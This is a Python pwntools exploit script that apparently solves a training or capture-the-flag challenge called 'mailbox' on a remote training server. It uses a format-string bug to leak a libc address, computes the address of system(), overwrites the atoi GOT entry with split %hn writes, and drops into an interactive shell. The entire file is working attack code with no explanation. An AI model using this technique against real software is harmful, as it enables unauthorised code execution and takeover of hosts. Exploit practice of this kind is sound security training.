from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./mailbox")
p = remote("training.jinblack.it", 2009)
#gdb.attach(p, '''b *0x80492d5''') #print menu
#gdb.attach(p, '''''') #print menu
#context.log_level = 'debug'

f = elf.ELF('./mailbox')
#libc = elf.ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = elf.ELF('./libc-2.27.so')

raw_input("Wait")
def returnFirstAddr(whatToWrite, whereToWrite):
	if(whatToWrite >> 16) > (whatToWrite & 0xffff):
		firstAddr = whereToWrite
		secondAddr = whereToWrite + 2
		firstHalf = whatToWrite & 0xffff
		secondHalf = whatToWrite >> 16
	else:
		firstAddr = whereToWrite + 2
		secondAddr = whereToWrite
		firstHalf = whatToWrite >> 16
		secondHalf = whatToWrite & 0xffff
	return p32(firstAddr)

def returnSecondAddr(whatToWrite, whereToWrite):
	if(whatToWrite >> 16) > (whatToWrite & 0xffff):
		firstAddr = whereToWrite
		secondAddr = whereToWrite + 2
		firstHalf = whatToWrite & 0xffff
		secondHalf = whatToWrite >> 16
	else:
		firstAddr = whereToWrite + 2
		secondAddr = whereToWrite
		firstHalf = whatToWrite >> 16
		secondHalf = whatToWrite & 0xffff
	return p32(secondAddr)

def calculateFormatString(whatToWrite, whereToWrite, displacement):
	if(whatToWrite >> 16) > (whatToWrite & 0xffff):
		firstAddr = whereToWrite
		secondAddr = whereToWrite + 2
		firstHalf = whatToWrite & 0xffff
		secondHalf = whatToWrite >> 16
	else:
		firstAddr = whereToWrite + 2
		secondAddr = whereToWrite
		firstHalf = whatToWrite >> 16
		secondHalf = whatToWrite & 0xffff
	return "%{}c%{}$hn".format(firstHalf, displacement) + \
	"%{}c%{}$hn".format(secondHalf - firstHalf, displacement + 1)

def insertMessage(message):
	p.recvuntil("Menu:")
	p.sendline("1")
	p.recvuntil("Insert a message:")
	p.sendline(message)

def printMessage():
	p.recvuntil("Menu:")
	p.sendline("2")	

def deleteMessage():
	p.recvuntil("Menu:")
	p.sendline("3")

displacement = 14

for x in xrange(0,0x2d):
	insertMessage("A")
insertMessage("%39$x")

for x in xrange(0,0x2e):
	deleteMessage()

printMessage()

p.recvuntil("No message in ")
leak = (p.recv(8)).strip()
leakhex = u32(leak.decode('hex'), endianness='big')
print "AAAAAAA: %#x " % leakhex

libcStartMainOffset = libc.symbols['__libc_start_main']
libcBase = leakhex - libcStartMainOffset - 241
systemAddr = libcBase + libc.symbols['system']
atoiGot = f.got['atoi']

print "SYSTEM: %#x " % systemAddr

oneAddr = returnFirstAddr(systemAddr, atoiGot)
twoAddr = returnSecondAddr(systemAddr, atoiGot)
print "FIRST ADDR: " + oneAddr 
print "SECOND ADDR: " + twoAddr 

for x in xrange(0,0x2d):
	insertMessage("A"*1473 + oneAddr + twoAddr)
insertMessage(calculateFormatString(systemAddr, atoiGot, displacement))

for x in xrange(0,0x2e):
	deleteMessage()

printMessage()

p.interactive()